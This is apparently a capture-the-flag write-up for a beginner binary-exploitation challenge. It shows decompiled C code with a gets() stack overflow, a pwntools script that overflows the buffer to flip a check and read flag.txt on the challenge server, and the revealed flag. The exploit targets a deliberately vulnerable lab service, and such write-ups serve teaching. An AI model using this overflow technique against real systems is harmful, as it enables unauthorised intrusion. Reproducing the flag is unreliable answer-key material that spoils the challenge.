#### Challenge:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[AAAAAAAAAAAAAAAA](./AAAAAAAAAAAAAAAA ":ignore")

`nc pwn.utctf.live 5000`

---

#### Solution:

Opening in `ghydra` we get classic `gets` stack overflow:

```c++
undefined8 main(void)

{
  char local_78 [111];
  char local_9;

  local_9 = '\0';
  gets(local_78);
  if (local_9 == 'B') {
    get_flag();
  }
  return 0;
}
```


```python
#!/usr/bin/env python

from pwn import *
from struct import *

r = remote('pwn.utctf.live', 5000)
# r = process('./AAAAAAAAAAAAAAAA')

payload = b'A'*(111) + b'B'

r.sendline(payload)
r.sendline("cat flag.txt")

print(r.recvline().decode('utf-8').strip())
r.close()
```

---

<details><summary>FLAG:</summary>

```
utflag{you_expected_the_flag_to_be_screaming_but_it_was_me_dio98054042}
```

</details>
<br/>
